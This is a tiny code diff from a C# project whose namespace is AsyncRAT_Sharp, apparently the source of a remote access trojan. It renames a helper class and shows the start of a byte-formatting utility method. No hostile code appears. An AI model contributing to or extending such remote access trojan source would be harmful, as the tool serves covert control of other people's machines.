@@ -2,7 +2,7 @@
 
 namespace AsyncRAT_Sharp
 {
-    class Helper
+    class Methods
     {
         public static string BytesToString(long byteCount)
         {
